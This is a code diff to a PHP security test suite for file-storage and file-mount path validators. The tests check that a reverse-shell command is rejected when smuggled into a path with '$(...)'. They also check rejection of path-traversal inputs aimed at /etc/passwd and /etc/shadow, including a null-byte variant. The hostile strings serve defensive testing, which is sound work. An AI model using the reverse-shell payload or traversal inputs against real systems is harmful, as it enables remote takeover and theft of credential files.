@@ -1,5 +1,7 @@
 <?php
 
+use App\Models\LocalFileVolume;
+
 /**
  * File Storage Security Tests
  *
@@ -47,27 +49,6 @@ test('file storage rejects command injection with redirect operators', function 
 test('file storage rejects reverse shell payload', function () {
     expect(fn () => validateShellSafePath('/tmp$(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)', 'storage path'))
         ->toThrow(Exception::class);
-});
-
-test('file storage escapes paths properly', function () {
-    $path = "/var/www/app's data";
-    $escaped = escapeshellarg($path);
-
-    expect($escaped)->toBe("'/var/www/app'\\''s data'");
-});
-
-test('file storage escapes paths with spaces', function () {
-    $path = '/var/www/my app/data';
-    $escaped = escapeshellarg($path);
-
-    expect($escaped)->toBe("'/var/www/my app/data'");
-});
-
-test('file storage escapes paths with special characters', function () {
-    $path = '/var/www/app (production)/data';
-    $escaped = escapeshellarg($path);
-
-    expect($escaped)->toBe("'/var/www/app (production)/data'");
 });
 
 test('file storage accepts legitimate absolute paths', function () {
@@ -140,4 +121,71 @@ test('file storage accepts relative dot-prefixed paths', function () {
 
     expect(fn () => validateShellSafePath('./data', 'storage path'))
         ->not->toThrow(Exception::class);
+});
+
+test('file mount path validator rejects parent segments and unsafe separators', function (string $path) {
+    expect(fn () => validateFileMountPath($path, 'file storage path'))
+        ->toThrow(Exception::class);
+})->with([
+    'parent segment to etc' => ['/../../etc/passwd'],
+    'embedded parent segment' => ['/foo/../bar'],
+    'parent segment' => ['/..'],
+    'double slash before parent segment' => ['/foo//../bar'],
+    'current directory segment' => ['/foo/./bar'],
+    'backslash parent segment' => ['\\..\\etc\\passwd'],
+    'null byte' => ["/app/config\0/../../etc/passwd"],
+]);
+
+test('file mount path validator accepts safe absolute container file paths', function (string $path, string $expected) {
+    expect(validateFileMountPath($path, 'file storage path'))->toBe($expected);
+})->with([
+    'nginx config' => ['/etc/nginx/nginx.conf', '/etc/nginx/nginx.conf'],
+    'app env filename' => ['/app/.env', '/app/.env'],
+    'relative input becomes absolute' => ['config/app.yaml', '/config/app.yaml'],
+    'duplicate slashes collapse' => ['/opt//app///config.json', '/opt/app/config.json'],
+]);
+
+test('host file mount path validator accepts absolute host file paths', function () {
+    expect(validateHostFileMountPath('/etc/nginx/nginx.conf', 'host file path'))
+        ->toBe('/etc/nginx/nginx.conf');
+});
+
+test('host file mount path validator rejects ambiguous or directory paths', function (string $path) {
+    expect(fn () => validateHostFileMountPath($path, 'host file path'))
+        ->toThrow(Exception::class);
+})->with([
+    'relative path' => ['etc/nginx/nginx.conf'],
+    'root directory' => ['/'],
+    'trailing slash' => ['/etc/nginx/'],
+    'parent segment' => ['/etc/../shadow'],
+    'current segment' => ['/etc/./nginx.conf'],
+    'backslash' => ['\\etc\\nginx.conf'],
+]);
+
+test('confined path resolver keeps file mounts inside their resource configuration root', function () {
+    expect(confineFileMountPath('/data/coolify/applications/app-uuid', '/etc/nginx/nginx.conf', 'file storage path'))
+        ->toBe('/data/coolify/applications/app-uuid/etc/nginx/nginx.conf');
+
+    expect(confineFileMountPath('/data/coolify/databases/db-uuid/', 'postgres/postgresql.conf', 'file storage path'))
+        ->toBe('/data/coolify/databases/db-uuid/postgres/postgresql.conf');
+
+    expect(confineFileMountPath('/data/coolify/services/service-uuid', '/config.yaml', 'file storage path'))
+        ->toBe('/data/coolify/services/service-uuid/config.yaml');
+});
+
+test('confined path resolver rejects paths that escape the resource configuration root', function (string $base, string $path) {
+    expect(fn () => confineFileMountPath($base, $path, 'file storage path'))
+        ->toThrow(Exception::class);
+})->with([
+    'application parent segment' => ['/data/coolify/applications/app-uuid', '/../../etc/passwd'],
+    'database parent segment' => ['/data/coolify/databases/db-uuid', '/postgres/../../../etc/shadow'],
+    'service dot segment' => ['/data/coolify/services/service-uuid', '/./config.yaml'],
+]);
+
+test('file storage permissions cannot be set by mass assignment', function () {
+    $volume = new LocalFileVolume;
+    $volume->fill(['chown' => 'root', 'chmod' => '777']);
+
+    expect($volume->chown)->toBeNull()
+        ->and($volume->chmod)->toBeNull();
 });
